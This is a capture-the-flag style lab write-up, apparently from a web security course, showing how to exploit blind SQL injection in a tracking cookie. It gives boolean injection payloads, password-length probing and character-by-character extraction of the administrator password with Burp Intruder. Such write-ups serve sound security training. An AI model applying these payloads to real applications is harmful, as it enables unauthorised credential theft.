This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

## Solution:

Query made --

> SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '<COOKIE-VALUE>'

![image](https://github.com/Nifalnasar/Web-Security-Lab/assets/141356053/195d1ca7-a2d7-4557-819e-e5c0a0e92a6c)

This how the session looks like where TrackingId and COOKIE-VALUE are shown and Welcome back message is also displyed.

TrackingID parameter is vulnerable. So it is vulnerablecan to blind SQL injection on trackingID parameter.

> If the Condition is true it will display the Welcome back message.

> SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND 1=1-- '

![image](https://github.com/Nifalnasar/Web-Security-Lab/assets/141356053/866926dc-2e61-41c0-864d-89cd3b4923a6)

> If the Condition is not true it will not  display the Welcome back message.

> SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND 1=2-- '

![image](https://github.com/Nifalnasar/Web-Security-Lab/assets/141356053/c6fbb63c-d5bc-4554-9107-2ece4033013a)

## Check Whether the users table is present -

> SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND (SELECT 'a' FROM users LIMIT 1) = 'a 

![image](https://github.com/Nifalnasar/Web-Security-Lab/assets/141356053/aac48369-cc93-45f7-a339-9d6185e7c63b)
It display the Welcome back message. So user table is present.

## Check Whether the username administrator is present in users table -

> Here table name is users

> SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND (SELECT 'a' FROM users WHERE username='administrator')='a

![image](https://github.com/Nifalnasar/Web-Security-Lab/assets/141356053/60775fab-bfdc-461a-b9f9-fb6b28bd8908)
It display the Welcome back message. So username administrator is present in the user table.

## Check the length password of administrator-

> SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>15))='a

![image](https://github.com/Nifalnasar/Web-Security-Lab/assets/141356053/412ae11b-7f48-4185-aa63-91d6c5f790ea)

Here 15 indicates the length of the password and it returns the response as true means the length of the password is greater than 15 as it displays the Welcome back message.

> Then changed the length from 15 to 25 

![image](https://github.com/Nifalnasar/Web-Security-Lab/assets/141356053/e3f56ac8-39e1-4ae2-9aa3-8711d8c5b86f)

It returns the response as false means the length of the password is less than 25 as it didn't display the Welcome back message.So the password length must be in between 15-25.

To find the length of the password send query to Intruder then and add the password length part [> 15] and select attack type as SNIPER.

![image](https://github.com/Nifalnasar/Web-Security-Lab/assets/141356053/19209855-8c3f-4165-ad20-24e6f228e454)

Then go to payload select payload type as numbers after that set from 15 to 25.

![image](https://github.com/Nifalnasar/Web-Security-Lab/assets/141356053/4fac815f-a16d-4d17-b708-0db7d5267fa8)

Then go to Grep-Match in setting and type Welcome back and start attack.

![image](https://github.com/Nifalnasar/Web-Security-Lab/assets/141356053/4a5a6efa-5ae2-4c78-ae79-e15e622bb66d)

After brute-force we understood that 20 is length of the password because while checking if length(password) > 20 it FAILS it didn't display the Welcome back message.

![image](https://github.com/Nifalnasar/Web-Security-Lab/assets/141356053/f3543470-90e9-418e-869f-311da328e62d)

## Finding the 20 character length password by Brute force -

> SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator' )='a

> we will able get the first character of the password that is u

![image](https://github.com/Nifalnasar/Web-Security-Lab/assets/141356053/25aa5f40-1120-453f-8c9a-ef98c05a316e)

> To get all character of the password together we need to set the attack type as cluster bomb and set to payloads one is for the position of the character and other one normal string payload and select 1st payload set as number [range 1-20] to determine the position of the character and other payload as brute force [min & max length = 1] to determine the character. And then go to Grep-Match in setting and type Welcome back and start attack.

> SELECT trackingId FROM some Table WHERE trackingId = '<COOKIE-VALUE>' AND (SELECT SUBSTRING(password,$1$,1) FROM users WHERE username='administrator' )='$a$'--

![image](https://github.com/Nifalnasar/Web-Security-Lab/assets/141356053/9d551c2f-787a-4f31-a86d-e43b74ff061b)

Now, we have received 20 different payloads that provide us with the 'Welcome back' option

![image](https://github.com/Nifalnasar/Web-Security-Lab/assets/141356053/415e7b70-712c-40a9-910a-b61e9d2af0d5)

Arrange the payload2 characters according to the payload1 numbers in the correct order .

> Password = uc5e5ot47gtajjumawrg

Successfully logged in administrator.

![image](https://github.com/Nifalnasar/Web-Security-Lab/assets/141356053/00ffa0c0-e187-401e-b14e-0b756520bcca)

